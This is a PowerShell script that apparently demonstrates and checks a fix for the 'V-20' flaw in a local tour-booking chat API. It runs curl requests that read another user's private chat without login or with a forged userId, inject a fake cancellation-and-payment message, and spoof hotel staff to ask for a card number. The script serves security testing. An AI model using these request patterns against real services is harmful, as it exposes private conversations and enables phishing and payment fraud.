# V-20 attack demonstration - chat sender spoofing and cross-account access.
#
#   powershell -ExecutionPolicy Bypass -File scripts\v20Attack.ps1
#
# Creates two real tourist accounts (Alice and Bob), each with their own booking,
# then has Alice attack Bob's private conversation. Uses curl.exe so HTTP status
# codes are reported exactly as the server sends them.

$API  = "http://localhost:4000"
$tmp  = [System.IO.Path]::GetTempFileName()

function Status($method, $url, $auth, $body) {
    $args = @("-s","-o","NUL","-w","%{http_code}","-X",$method,$url)
    if ($auth) { $args += @("-H","Authorization: Bearer $auth") }
    if ($body) {
        [System.IO.File]::WriteAllText($tmp, $body)
        $args += @("-H","Content-Type: application/json","-d","@$tmp")
    }
    return (curl.exe @args)
}
function Body($method, $url, $auth, $body) {
    $args = @("-s","-X",$method,$url)
    if ($auth) { $args += @("-H","Authorization: Bearer $auth") }
    if ($body) {
        [System.IO.File]::WriteAllText($tmp, $body)
        $args += @("-H","Content-Type: application/json","-d","@$tmp")
    }
    return (curl.exe @args)
}
function Show($code, $meansAttackWorked) {
    if ($code -match '^2') {
        Write-Host ">>> HTTP status: $code   <-- $meansAttackWorked" -ForegroundColor Red
    } else {
        Write-Host ">>> HTTP status: $code   <-- BLOCKED BY SERVER" -ForegroundColor Green
    }
}

# --- build two real accounts with bookings, straight into the database -------
Write-Host ""
Write-Host "Setting up two accounts (Alice and Bob), each with a private booking..."
$setup = node scripts/v20SetupFixtures.js
$parts = $setup -split "\|"
if ($parts.Count -lt 4) {
    Write-Host "Setup failed:" -ForegroundColor Yellow
    Write-Host $setup
    exit 1
}
$aliceToken   = $parts[0]
$aliceBooking = $parts[1]
$bobToken     = $parts[2]
$bobBooking   = $parts[3]
$aliceId      = $parts[4]
$bobId        = $parts[5]

Write-Host "  Alice booking: $aliceBooking"
Write-Host "  Bob   booking: $bobBooking"

Write-Host ""
Write-Host "############################################################"
Write-Host "#  ATTACK 1 - Read a private conversation with no login    #"
Write-Host "############################################################"
Write-Host ""
Write-Host "`$ curl `"$API/api/chat?bookingId=$bobBooking`""
Write-Host ""
$out = Body "GET" "$API/api/chat?bookingId=$bobBooking" $null $null
if ($out.Length -gt 400) { $out = $out.Substring(0,400) + "..." }
Write-Host $out
Write-Host ""
Show (Status "GET" "$API/api/chat?bookingId=$bobBooking" $null $null) "PRIVATE CHAT READ, NO LOGIN"

Write-Host ""
Write-Host "############################################################"
Write-Host "#  ATTACK 2 - Alice reads Bob's private conversation       #"
Write-Host "############################################################"
Write-Host ""
Write-Host "Alice is logged in as herself, but asks for Bob's booking and"
Write-Host "supplies Bob's identifier as the 'userId' the old code filtered on:"
Write-Host ""
$readUrl = "$API/api/chat?bookingId=$bobBooking&userId=$bobId&senderModel=Tourist"
Write-Host "`$ curl -H `"Authorization: Bearer <ALICE>`" \"
Write-Host "    `"$API/api/chat?bookingId=<BOB'S BOOKING>&userId=<BOB'S ID>&senderModel=Tourist`""
Write-Host ""
$out2 = Body "GET" $readUrl $aliceToken $null
if ($out2.Length -gt 400) { $out2 = $out2.Substring(0,400) + "..." }
Write-Host $out2
Write-Host ""
Show (Status "GET" $readUrl $aliceToken $null) "ALICE READ BOB'S PRIVATE MESSAGES"

Write-Host ""
Write-Host "############################################################"
Write-Host "#  ATTACK 3 - Alice injects a message into Bob's chat      #"
Write-Host "############################################################"
Write-Host ""
$inject = '{"sender":"' + $bobId + '","senderModel":"Business","bookingId":"' + $bobBooking + '","message":"Your tour is cancelled. Send payment to this account instead."}'
Write-Host "`$ curl -X POST $API/api/chat -H `"Authorization: Bearer <ALICE>`" \"
Write-Host "    -d '{""sender"":""<BOB'S ID>"",""senderModel"":""Business"","
Write-Host "         ""bookingId"":""$bobBooking"","
Write-Host "         ""message"":""Your tour is cancelled. Send payment...""}'"
Write-Host ""
$o3 = Body "POST" "$API/api/chat" $aliceToken $inject
if ($o3.Length -gt 420) { $o3 = $o3.Substring(0,420) + "..." }
Write-Host $o3
Write-Host ""
Show (Status "POST" "$API/api/chat" $aliceToken $inject) "FAKE MESSAGE PLANTED IN BOB'S CHAT"

Write-Host ""
Write-Host "############################################################"
Write-Host "#  ATTACK 4 - Alice posts as staff in her own chat         #"
Write-Host "############################################################"
Write-Host ""
Write-Host "Alice is a tourist, but claims to be the business:"
Write-Host ""
$spoof = '{"sender":"OFFICIAL-SUPPORT","senderModel":"Business","bookingId":"' + $aliceBooking + '","message":"This is the hotel. Please confirm your card number."}'
Write-Host "`$ curl -X POST $API/api/chat -H `"Authorization: Bearer <ALICE>`" \"
Write-Host "    -d '{""sender"":""OFFICIAL-SUPPORT"",""senderModel"":""Business"",...}'"
Write-Host ""
$o4 = Body "POST" "$API/api/chat" $aliceToken $spoof
if ($o4 -match '"sender":"([^"]*)"') {
    $storedSender = $matches[1]
    $storedModel  = if ($o4 -match '"senderModel":"([^"]*)"') { $matches[1] } else { "?" }
    Write-Host "    message was saved with:"
    if ($storedSender -eq "OFFICIAL-SUPPORT" -or $storedModel -eq "Business") {
        Write-Host "      sender      = $storedSender" -ForegroundColor Red
        Write-Host "      senderModel = $storedModel" -ForegroundColor Red
        Write-Host ""
        Write-Host ">>> IDENTITY SPOOFED - Alice appears as hotel staff" -ForegroundColor Red
    } else {
        Write-Host "      sender      = $storedSender   (Alice's real id)" -ForegroundColor Green
        Write-Host "      senderModel = $storedModel   (not the forged 'Business')" -ForegroundColor Green
        Write-Host ""
        Write-Host ">>> FORGED FIELDS IGNORED - server used the token identity" -ForegroundColor Green
    }
} else {
    Write-Host $o4
    Write-Host ""
    Show (Status "POST" "$API/api/chat" $aliceToken $spoof) "IDENTITY SPOOFED"
}

Write-Host ""
node scripts/v20SetupFixtures.js --cleanup | Out-Null
Write-Host "(test accounts removed)" -ForegroundColor DarkGray
Remove-Item $tmp -ErrorAction SilentlyContinue
Write-Host ""
